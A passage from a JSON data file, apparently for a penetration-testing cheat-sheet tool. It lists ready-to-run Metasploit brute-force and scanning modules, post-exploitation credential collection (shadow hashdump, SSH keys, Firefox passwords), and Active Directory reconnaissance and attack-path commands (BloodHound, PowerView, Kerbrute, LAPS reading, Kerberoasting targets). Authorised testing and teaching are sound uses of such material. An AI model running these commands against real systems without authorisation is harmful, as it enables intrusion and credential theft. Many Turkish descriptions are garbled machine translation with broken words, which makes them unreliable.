              "set PORTS 1-1024",
              "set THREADS 20",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Perform a TCP port scan through a pivot",
            "desc_tr": "Perform a TCP port taraması a pivot üzerinden"
          },
          {
            "title": "SMB Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/smb/smb_login",
              "set RHOSTS <TARGET_IP>",
              "set SMBUser <USER>",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force SMB authentication credentials",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB kimlik doğrulama kimlik bilgileri"
          },
          {
            "title": "SSH Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/ssh/ssh_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME <USER>",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "set THREADS 5",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force SSH credentials",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri"
          },
          {
            "title": "FTP Anonymous Check",
            "cmds": [
              "use auxiliary/scanner/ftp/anonymous",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Check for anonymous FTP access on targets",
            "desc_tr": "Kontrol et: for anonymous FTP access targets üzerinde"
          },
          {
            "title": "HTTP Directory Scanner",
            "cmds": [
              "use auxiliary/scanner/http/dir_scanner",
              "set RHOSTS <TARGET_IP>",
              "set THREADS 10",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for common directories on web servers",
            "desc_tr": "Tara: ma for commdirectories on web servers üzerinde"
          },
          {
            "title": "SNMP Community Scanner",
            "cmds": [
              "use auxiliary/scanner/snmp/snmp_enum",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate SNMP community strings and information",
            "desc_tr": "Listele: SNMP community strings and information"
          },
          {
            "title": "VNC None Auth Scanner",
            "cmds": [
              "use auxiliary/scanner/vnc/vnc_none_auth",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for VNC servers with no authentication",
            "desc_tr": "Tara: ma for VNC servers no kimlik doğrulama ile"
          },
          {
            "title": "MSSQL Login Scanner",
            "cmds": [
              "use auxiliary/scanner/mssql/mssql_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME sa",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force Microsoft SQL Server credentials",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Microsoft SQL Server kimlik bilgileri"
          },
          {
            "title": "HTTP Login Brute Force",
            "cmds": [
              "use auxiliary/scanner/http/http_login",
              "set RHOSTS <TARGET_IP>",
              "set AUTH_URI /admin/",
              "set USER_FILE users.txt",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force HTTP Basic/Digest authentication",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic/Digest kimlik doğrulama"
          },
          {
            "title": "MySQL Login Scanner",
            "cmds": [
              "use auxiliary/scanner/mysql/mysql_login",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME root",
              "set PASS_FILE /usr/share/wordlists/rockyou.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Brute force MySQL credentials",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri"
          },
          {
            "title": "NFS Share Scanner",
            "cmds": [
              "use auxiliary/scanner/nfs/nfsmount",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for NFS shares across the network",
            "desc_tr": "Tara: ma for NFS shares the network genelinde"
          },
          {
            "title": "SMTP User Enum",
            "cmds": [
              "use auxiliary/scanner/smtp/smtp_enum",
              "set RHOSTS <TARGET_IP>",
              "set USER_FILE /usr/share/seclists/Usernames/Names/names.txt",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users via SMTP VRFY/EXPN/RCPT",
            "desc_tr": "Listele: users SMTP VRFY/EXPN/RCPT üzerinden"
          },
          {
            "title": "RDP BlueKeep Scanner",
            "cmds": [
              "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
              "set RHOSTS <TARGET_RANGE>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan for CVE-2019-0708 BlueKeep vulnerability",
            "desc_tr": "Tara: ma for CVE-2019-0708 BlueKeep zafiyet(ler)"
          },
          {
            "title": "HTTP WordPress Scanner",
            "cmds": [
              "use auxiliary/scanner/http/wordpress_scanner",
              "set RHOSTS <TARGET_IP>",
              "set TARGETURI /wordpress/",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Scan WordPress installations for common issues",
            "desc_tr": "Tara: ma WordPress installations for commissues üzerinde"
          },
          {
            "title": "IPMI Hash Dumper",
            "cmds": [
              "use auxiliary/scanner/ipmi/ipmi_dumphashes",
              "set RHOSTS <TARGET_IP>",
              "run"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Dump IPMI password hashes (RAKP authentication)",
            "desc_tr": "Dökümle: IPMI password hashes (RAKP kimlik doğrulama)"
          }
        ],
        "name_tr": "Auxiliary Modules"
      },
      {
        "name": "Post-Exploitation Modules",
        "commands": [
          {
            "title": "Windows Gather Credentials",
            "cmd": "run post/windows/gather/credentials/credential_collector",
            "tags": [
              "tool"
            ],
            "desc": "Collect various credentials from the target",
            "desc_tr": "Topla: various kimlik bilgileri the target üzerinden"
          },
          {
            "title": "Windows Enum Applications",
            "cmd": "run post/windows/gather/enum_applications",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate installed applications on Windows target",
            "desc_tr": "Listele: installed applications Windows target üzerinde"
          },
          {
            "title": "Windows Enum Services",
            "cmd": "run post/windows/gather/enum_services",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate running services on Windows target",
            "desc_tr": "Listele: çalışan service Windows target üzerinde"
          },
          {
            "title": "Windows Enum Patches",
            "cmd": "run post/windows/gather/enum_patches",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate installed patches and hotfixes",
            "desc_tr": "Listele: yüklü patches and hotfixes"
          },
          {
            "title": "Windows Check VM",
            "cmd": "run post/windows/gather/checkvm",
            "tags": [
              "tool"
            ],
            "desc": "Detect if target is a virtual machine",
            "desc_tr": "Algıla: if target is a virtual machine"
          },
          {
            "title": "Windows Enum Domain",
            "cmd": "run post/windows/gather/enum_domain",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain information from Windows target",
            "desc_tr": "Listele: domainformatiWindows target üzerinden üzerinde içinde"
          },
          {
            "title": "Windows Enum Domain Users",
            "cmd": "run post/windows/gather/enum_ad_users",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Active Directory users",
            "desc_tr": "Listele: Active Directory users"
          },
          {
            "title": "Windows Enum Domain Groups",
            "cmd": "run post/windows/gather/enum_ad_groups",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Active Directory groups",
            "desc_tr": "Listele: Active Directory groups"
          },
          {
            "title": "Linux Enum Network",
            "cmd": "run post/linux/gather/enum_network",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate network configuration on Linux target",
            "desc_tr": "Listele: network configuration Linux target üzerinde"
          },
          {
            "title": "Linux Enum Users/History",
            "cmd": "run post/linux/gather/enum_users_history",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users and their command history",
            "desc_tr": "Listele: users and their komut geçmişi"
          },
          {
            "title": "Linux Hashdump",
            "cmd": "run post/linux/gather/hashdump",
            "tags": [
              "essential"
            ],
            "desc": "Dump password hashes from /etc/shadow",
            "desc_tr": "Dökümle: password hashes /etc/shadow üzerinden"
          },
          {
            "title": "Multi Gather SSH Creds",
            "cmd": "run post/multi/gather/ssh_creds",
            "tags": [
              "tool"
            ],
            "desc": "Collect SSH keys and known hosts from target",
            "desc_tr": "Topla: SSH keys and known hosts target üzerinden"
          },
          {
            "title": "Multi Gather Firefox Creds",
            "cmd": "run post/multi/gather/firefox_creds",
            "tags": [
              "tool"
            ],
            "desc": "Extract saved passwords from Firefox profiles",
            "desc_tr": "Çıkart: kayıtlı passwords Firefox profiles üzerinden"
          },
          {
            "title": "Multi Manage Autoroute",
            "cmd": "run post/multi/manage/autoroute",
            "tags": [
              "essential"
            ],
            "desc": "Add routes to internal subnets through the session",
            "desc_tr": "Ekle: routes internal subnets the session'e üzerinden"
          }
        ],
        "name_tr": "Post-Exploitation Modules"
      }
    ],
    "name_tr": "Metasploit İşlemleri",
    "description_tr": "Metasploit Framework for exploitation, post-exploitation, and pivoting"
  },
  {
    "id": "ad-recon",
    "name": "Active Directory Reconnaissance",
    "icon": "🏢",
    "description": "Enumerate Active Directory domains, users, groups, trusts, and attack paths",
    "subcategories": [
      {
        "name": "Domain Discovery",
        "commands": [
          {
            "title": "SharpHound Collection (All)",
            "cmd": "SharpHound.exe -c All --outputdirectory C:\\Temp\\",
            "tags": [
              "essential"
            ],
            "desc": "Collect all BloodHound data from the domain",
            "desc_tr": "Topla: tüm BloodHound data the domaüzerinden içinde"
          },
          {
            "title": "SharpHound (Stealth)",
            "cmd": "SharpHound.exe -c DCOnly --stealth",
            "tags": [
              "advanced"
            ],
            "desc": "Collect BloodHound data using only DC queries for stealth",
            "desc_tr": "Topla: BloodHound data only DC queries for stealth kullanarak"
          },
          {
            "title": "BloodHound-Python (Remote)",
            "cmd": "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all",
            "tags": [
              "essential"
            ],
            "desc": "Collect BloodHound data remotely from Linux",
            "desc_tr": "Topla: BloodHound data remotely Linux üzerinden"
          },
          {
            "title": "Start Neo4j for BloodHound",
            "cmd": "sudo neo4j console",
            "tags": [
              "essential"
            ],
            "desc": "Start the Neo4j database backend for BloodHound",
            "desc_tr": "Başlat: the Neo4j database backend for BloodHound"
          },
          {
            "title": "PowerView Get-Domain",
            "cmd": "Get-Domain",
            "tags": [
              "essential"
            ],
            "desc": "Get information about the current domain",
            "desc_tr": "Al: informatiabout the mevcut domaüzerinde içinde"
          },
          {
            "title": "PowerView Get-DomainController",
            "cmd": "Get-DomainController",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate domain controllers in the current domain",
            "desc_tr": "Listele: domacontrollers in the mevcut domain içinde"
          },
          {
            "title": "AD Module Get-ADDomain",
            "cmd": "Get-ADDomain",
            "tags": [
              "essential"
            ],
            "desc": "Get detailed domain information via AD PowerShell module",
            "desc_tr": "Al: detailed domainformatiAD PowerShell module üzerinden üzerinde içinde"
          },
          {
            "title": "Enum4linux-ng Full Scan",
            "cmd": "enum4linux-ng -A <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Comprehensive SMB/LDAP/RPC enumeration",
            "desc_tr": "Kapsamlı SMB/LDAP/RPC listeleme"
          },
          {
            "title": "LDAP Domain Dump",
            "cmd": "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' --no-json --no-grep",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain objects via LDAP into HTML reports",
            "desc_tr": "Dökümle: tüm domaobjects LDAP inHTML reports üzerinden'e içinde"
          },
          {
            "title": "Windapsearch Users",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -U",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain users via LDAP",
            "desc_tr": "Listele: etki alanı kullanıcıları LDAP üzerinden"
          },
          {
            "title": "Windapsearch Computers",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -C",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain computers via LDAP",
            "desc_tr": "Listele: etki alanı bilgisayarları LDAP üzerinden"
          },
          {
            "title": "Kerbrute User Enumeration",
            "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /path/to/userlist.txt",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate valid domain usernames via Kerberos without authentication",
            "desc_tr": "Listele: valid domausernames Kerberos kimlik doğrulama üzerinden içinde olmadan"
          },
          {
            "title": "Impacket GetADUsers",
            "cmd": "impacket-GetADUsers -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain users via LDAP with impacket",
            "desc_tr": "Listele: tüm etki alanı kullanıcıları LDAP impacket üzerinden ile"
          },
          {
            "title": "Impacket Lookupsid",
            "cmd": "impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain SIDs and associated accounts via RPC",
            "desc_tr": "Listele: domaSIDs and associated accounts RPC üzerinden içinde"
          },
          {
            "title": "DNS Zone Transfer Attempt",
            "cmd": "dig axfr <DOMAIN> @<DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Attempt a DNS zone transfer from a domain controller",
            "desc_tr": "Dene: a DNS zone transferi a etki alanı denetleyicisi (DC) üzerinden"
          },
          {
            "title": "PingCastle",
            "desc": "AD security assessment",
            "cmd": ".\\PingCastle.exe --healthcheck --server <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "AD security assessment"
          },
          {
            "title": "ldapdomaindump",
            "desc": "Dump AD via LDAP",
            "cmd": "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o ldapdump/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: AD LDAP üzerinden"
          }
        ],
        "name_tr": "Domain Discovery"
      },
      {
        "name": "User & Group Enumeration",
        "commands": [
          {
            "title": "PowerView Get All Users",
            "cmd": "Get-DomainUser | Select-Object samaccountname, description, memberof",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain users with key attributes",
            "desc_tr": "Listele: tüm etki alanı kullanıcıları key attributes ile"
          },
          {
            "title": "PowerView Get Specific User",
            "cmd": "Get-DomainUser -Identity <USER> -Properties *",
            "tags": [
              "essential"
            ],
            "desc": "Get all properties for a specific domain user",
            "desc_tr": "Al: tüm properties for a belirli etki alanı kullanıcıları"
          },
          {
            "title": "PowerView Get Domain Groups",
            "cmd": "Get-DomainGroup | Select-Object samaccountname",
            "tags": [
              "essential"
            ],
            "desc": "List all domain groups",
            "desc_tr": "Listele: tüm etki alanı grupları"
          },
          {
            "title": "PowerView Get Group Members",
            "cmd": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
            "tags": [
              "essential"
            ],
            "desc": "Recursively enumerate members of Domain Admins",
            "desc_tr": "Recursively enumerate members of DomaAdmin içinde"
          },
          {
            "title": "PowerView Get Domain Computers",
            "cmd": "Get-DomainComputer | Select-Object dnshostname, operatingsystem",
            "tags": [
              "essential"
            ],
            "desc": "List all domain computers with OS info",
            "desc_tr": "Listele: tüm etki alanı bilgisayarları OS info ile"
          },
          {
            "title": "PowerView Get Domain OUs",
            "cmd": "Get-DomainOU | Select-Object name, distinguishedname",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate all Organizational Units in the domain",
            "desc_tr": "Listele: tüm Organizational Units the domain içinde"
          },
          {
            "title": "PowerView Get Domain GPOs",
            "cmd": "Get-DomainGPO | Select-Object displayname, gpcfilesyspath",
            "tags": [
              "tool"
            ],
            "desc": "List all Group Policy Objects in the domain",
            "desc_tr": "Listele: tüm Group Policy Objects the domain içinde"
          },
          {
            "title": "AD Module Get-ADUser (All)",
            "cmd": "Get-ADUser -Filter * -Properties * | Select-Object samaccountname, description, lastlogondate",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all AD users with properties",
            "desc_tr": "Listele: tüm AD users properties ile"
          },
          {
            "title": "AD Module Get-ADGroup",
            "cmd": "Get-ADGroup -Filter * | Select-Object name, groupscope",
            "tags": [
              "tool"
            ],
            "desc": "List all AD groups with their scope",
            "desc_tr": "Listele: tüm AD groups their scope ile"
          },
          {
            "title": "AD Module Get-ADComputer",
            "cmd": "Get-ADComputer -Filter * -Properties * | Select-Object name, operatingsystem, lastlogondate",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate all AD computers with OS and last logon",
            "desc_tr": "Listele: tüm AD computers OS and last logile üzerinde"
          },
          {
            "title": "Net User Domain Query",
            "cmd": "net user /domain",
            "tags": [
              "essential"
            ],
            "desc": "List all domain users via built-in Windows command",
            "desc_tr": "Listele: tüm etki alanı kullanıcıları built-Windows command üzerinden içinde"
          },
          {
            "title": "Net Group Domain Admins",
            "cmd": "net group \"Domain Admins\" /domain",
            "tags": [
              "essential"
            ],
            "desc": "List members of Domain Admins via built-in command",
            "desc_tr": "Listele: members of DomaAdmin built-in command üzerinden içinde"
          },
          {
            "title": "Find Users with Descriptions",
            "cmd": "Get-DomainUser -LDAPFilter '(description=*)' | Select-Object samaccountname, description",
            "tags": [
              "tool"
            ],
            "desc": "Find users with descriptions that may contain passwords",
            "note": "Descriptions often contain password hints or temporary passwords",
            "desc_tr": "Bul: users descriptions that may contapasswords ile içinde"
          },
          {
            "title": "PowerView Find Local Admin Access",
            "cmd": "Find-LocalAdminAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find machines where the current user has local admin access",
            "desc_tr": "Bul: machines where the mevcut user has yerel yönetici access"
          },
          {
            "title": "PowerView Get-NetSession",
            "cmd": "Get-NetSession -ComputerName <DC_HOSTNAME>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate active sessions on a target computer",
            "desc_tr": "Listele: active sessions a target computer üzerinde"
          },
          {
            "title": "PowerView Get-NetLoggedon",
            "cmd": "Get-NetLoggedon -ComputerName <TARGET_HOSTNAME>",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate users logged onto a target computer",
            "desc_tr": "Listele: users logged ona target computer'e"
          },
          {
            "title": "PowerView Invoke-ShareFinder",
            "cmd": "Invoke-ShareFinder -Verbose -CheckShareAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find accessible network shares across the domain",
            "desc_tr": "Bul: accessible network shares the domain genelinde"
          },
          {
            "title": "PowerView Get-DomainSID",
            "cmd": "Get-DomainSID",
            "tags": [
              "essential"
            ],
            "desc": "Get the current domain SID",
            "desc_tr": "Al: the mevcut domaSID içinde"
          },
          {
            "title": "PowerView Find-LocalAdminAccess Threaded",
            "cmd": "Find-LocalAdminAccess -Threads 20",
            "tags": [
              "essential"
            ],
            "desc": "Find machines where current user has local admin (threaded)",
            "desc_tr": "Bul: machines where mevcut user has yerel yönetici (threaded)"
          },
          {
            "title": "Windapsearch Groups",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> -G",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain groups via LDAP",
            "desc_tr": "Listele: etki alanı grupları LDAP üzerinden"
          },
          {
            "title": "Windapsearch Privileged Users",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --da",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate domain admins via LDAP",
            "desc_tr": "Listele: DomaAdmin LDAP üzerinden içinde"
          },
          {
            "title": "Windapsearch Unconstrained Delegation",
            "cmd": "windapsearch -d <DOMAIN> -u <USER>@<DOMAIN> -p <PASS> --dc <DC_IP> --unconstrained",
            "tags": [
              "tool"
            ],
            "desc": "Find unconstrained delegation computers via LDAP",
            "desc_tr": "Bul: sınırsız delegasycomputers LDAP üzerinden üzerinde"
          },
          {
            "title": "LDAP Domain Dump HTML",
            "cmd": "ldapdomaindump <DC_IP> -u '<DOMAIN>\\<USER>' -p '<PASS>' -o /tmp/ldap_dump/",
            "tags": [
              "essential"
            ],
            "desc": "Generate browsable HTML reports of domain objects",
            "desc_tr": "Oluştur: browsable HTML reports of domaobjects içinde"
          },
          {
            "title": "Kerbrute Brute Force",
            "cmd": "kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> /usr/share/wordlists/rockyou.txt <USER>",
            "tags": [
              "tool"
            ],
            "desc": "Brute force a single user password via Kerberos",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı a single user password Kerberos üzerinden"
          },
          {
            "title": "Enum GPO Permissions",
            "cmd": "Get-DomainGPO | ForEach-Object { Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs } | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner' } | Select-Object ObjectDN, ActiveDirectoryRights, IdentityReferenceName",
            "tags": [
              "advanced"
            ],
            "desc": "Find GPOs that can be modified by non-admin users",
            "desc_tr": "Bul: GPOs that can be modified by non-admusers içinde"
          },
          {
            "title": "Enum GPO Linked to OUs",
            "cmd": "Get-DomainOU | ForEach-Object { $ou = $_; ($_.gplink -split '\\[LDAP://') | ForEach-Object { if($_) { [PSCustomObject]@{OU=$ou.name; GPO=$_.split(';')[0].TrimEnd(']')} } } }",
            "tags": [
              "advanced"
            ],
            "desc": "Map GPOs to their linked Organizational Units",
            "desc_tr": "Map GPOs their linked Organizational Units'e"
          },
          {
            "title": "LAPS Check via CrackMapExec",
            "cmd": "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> -M laps",
            "tags": [
              "essential"
            ],
            "desc": "Check if LAPS passwords are readable",
            "desc_tr": "Kontrol et: if LAPS passwords are readable"
          },
          {
            "title": "ADRecon Comprehensive Report",
            "cmd": "powershell -ep bypass -c \"Import-Module .\\ADRecon.ps1; Invoke-ADRecon -Method LDAP -DomainController <DC_IP> -Credential $cred\"",
            "tags": [
              "tool"
            ],
            "desc": "Generate comprehensive AD reconnaissance report",
            "desc_tr": "Oluştur: comprehensive AD keşif report"
          }
        ],
        "name_tr": "User & Group Enumeration"
      },
      {
        "name": "ACL Analysis",
        "commands": [
          {
            "title": "Find Interesting Domain ACLs",
            "cmd": "Find-InterestingDomainAcl -ResolveGUIDs",
            "tags": [
              "essential"
            ],
            "desc": "Find ACLs with interesting permissions across the domain",
            "desc_tr": "Bul: ACLs ilginç permissions the domaile içinde genelinde"
          },
          {
            "title": "Get ACL for Specific User",
            "cmd": "Get-DomainObjectAcl -Identity <USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'}",
            "tags": [
              "essential"
            ],
            "desc": "Check what permissions exist on a specific user object",
            "desc_tr": "Kontrol et: what permissions exist a belirli user object üzerinde"
          },
          {
            "title": "Find ACLs for Current User",
            "cmd": "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match '<USER>'}",
            "tags": [
              "essential"
            ],
            "desc": "Find all ACL entries that grant permissions to a specific user",
            "desc_tr": "Bul: tüm ACL entries that grant permissions a belirli user'e"
          },
          {
            "title": "Get ACL on Domain Object",
            "cmd": "Get-DomainObjectAcl -SearchBase 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq 'GenericAll'}",
            "tags": [
              "advanced"
            ],
            "desc": "Search for GenericAll permissions at the domain level",
            "desc_tr": "Ara: for GenericAll permissions at the domalevel içinde"
          },
          {
            "title": "Check WriteDACL on Group",
            "cmd": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Check who has WriteDACL permission on Domain Admins",
            "desc_tr": "Kontrol et: who has WriteDACL permission DomaAdmin üzerinde içinde"
          },
          {
            "title": "Enumerate GPO Permissions",
            "cmd": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Find writable Group Policy Objects for potential abuse",
            "desc_tr": "Bul: writable Group Policy Objects for potential abuse"
          }
        ],
        "name_tr": "ACL Analysis"
      },
      {
        "name": "Trust Mapping",
        "commands": [
          {
            "title": "PowerView Get Domain Trusts",
            "cmd": "Get-DomainTrust",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all domain trust relationships",
            "desc_tr": "Listele: tüm etki alanı güven ilişkileri relationships"
          },
          {
            "title": "PowerView Get Forest Trusts",
            "cmd": "Get-ForestTrust",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate forest-level trust relationships",
            "desc_tr": "Listele: forest-level trust relationships"
          },
          {
            "title": "AD Module Get-ADTrust",
            "cmd": "Get-ADTrust -Filter *",
            "tags": [
              "essential"
            ],
            "desc": "List all AD trust relationships via AD module",
            "desc_tr": "Listele: tüm AD trust relationships AD module üzerinden"
          },
          {
            "title": "Map All Domain Trusts",
            "cmd": "Get-DomainTrust -Domain <DOMAIN> | Select-Object SourceName, TargetName, TrustDirection, TrustType",
            "tags": [
              "tool"
            ],
            "desc": "Map trust direction and type for all trusts",
            "desc_tr": "Map trust directiand type for tüm trusts üzerinde"
          },
          {
            "title": "Enumerate Foreign Group Members",
            "cmd": "Get-DomainForeignGroupMember -Domain <DOMAIN>",
            "tags": [
              "advanced"
            ],
            "desc": "Find users from foreign domains in local groups",
            "desc_tr": "Bul: users foreign domains yerel groups üzerinden içinde"
          },
          {
            "title": "Find Domain Shares",
            "cmd": "Find-DomainShare -CheckShareAccess",
            "tags": [
              "essential"
            ],
            "desc": "Find accessible domain shares across the network",
            "desc_tr": "Bul: accessible domashares the network içinde genelinde"
          },
          {
            "title": "Invoke-ShareFinder",
            "cmd": "Invoke-ShareFinder -Verbose",
            "tags": [
              "essential"
            ],
            "desc": "Discover and enumerate network shares across the domain",
            "desc_tr": "Keşfet: and enumerate network shares the domain genelinde"
          }
        ],
        "name_tr": "Trust Mapping"
      },
      {
        "name": "SPN & Delegation Discovery",
        "commands": [
          {
            "title": "Find Kerberoastable Users",
            "cmd": "Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname",
            "tags": [
              "essential"
            ],
            "desc": "Find users with SPNs set (Kerberoastable)",
            "desc_tr": "Bul: users SPNs set (Kerberoastable) ile"
          },
          {
            "title": "Find AS-REP Roastable Users",
            "cmd": "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname",
            "tags": [
              "essential"
            ],
            "desc": "Find users with Kerberos pre-auth disabled",
            "desc_tr": "Bul: users Kerberos pre-auth disabled ile"
          },
          {
            "title": "Setspn Query All SPNs",
            "cmd": "setspn -T <DOMAIN> -Q */*",
            "tags": [
              "essential"
            ],
            "desc": "Query all registered SPNs in the domain",
            "desc_tr": "Sorgula: tüm registered SPNs the domain içinde"
          },
          {
            "title": "Find Unconstrained Delegation",
            "cmd": "Get-DomainComputer -Unconstrained | Select-Object dnshostname",
            "tags": [
              "essential"
            ],
            "desc": "Find computers with unconstrained delegation enabled",
            "desc_tr": "Bul: computers sınırsız delegasyenabled ile üzerinde"
          },
          {
            "title": "Find Constrained Delegation",
            "cmd": "Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto",
            "tags": [
              "essential"
            ],
            "desc": "Find computers with constrained delegation configured",
            "desc_tr": "Bul: computers kısıtlı delegasyconfigured ile üzerinde"
          },
          {
            "title": "Find User Constrained Delegation",
            "cmd": "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
            "tags": [
              "tool"
            ],
            "desc": "Find users with constrained delegation configured",
            "desc_tr": "Bul: users kısıtlı delegasyconfigured ile üzerinde"
          },
          {
            "title": "Find RBCD Targets",
            "cmd": "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc": "Find computers where RBCD can be configured",
            "desc_tr": "Bul: computers where RBCD can be configured"
          },
          {
            "title": "LAPS Password Discovery",
            "cmd": "Get-DomainComputer | ? {'ms-Mcs-AdmPwd' -in $_.Properties.PropertyNames} | Select-Object dnshostname, ms-mcs-admpwd",
            "tags": [
              "essential"
            ],
            "desc": "Read LAPS passwords if the current user has access",
            "note": "Requires read permission on ms-Mcs-AdmPwd attribute",
            "desc_tr": "Oku: LAPS passwords if the mevcut user has access"
          },
          {
            "title": "Check LAPS Deployment",
            "cmd": "Get-DomainComputer -LDAPFilter '(ms-Mcs-AdmPwdExpirationTime=*)' | Select-Object dnshostname",
            "tags": [
              "tool"
            ],
            "desc": "Identify computers where LAPS is deployed",
            "desc_tr": "Tespit et: computers where LAPS is deployed"
          },
          {
            "title": "Impacket FindDelegation",
            "cmd": "impacket-findDelegation '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Find all delegation configurations using impacket",
            "desc_tr": "Bul: tüm delegaticonfigurations impacket kullanarak üzerinde"
          }
        ],
        "name_tr": "SPN & Delegation Discovery"
      },
      {
        "name": "ADCS Enumeration",
        "commands": [
          {
            "title": "Certify Find All",
            "desc": "Enumerate CAs",
            "cmd": ".\\Certify.exe find",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: CAs"
          },
          {
            "title": "Certify Find Vulnerable",
            "desc": "Find vulnerable templates",
            "cmd": ".\\Certify.exe find /vulnerable",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: zafiyet(ler) templates"
          },
          {
            "title": "Certipy Find Vulnerable",
            "desc": "Remote ADCS enum",
            "cmd": "certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable",
            "tags": [
              "essential"
            ],
            "desc_tr": "Uzaktan ADCS enum"
          }
        ],
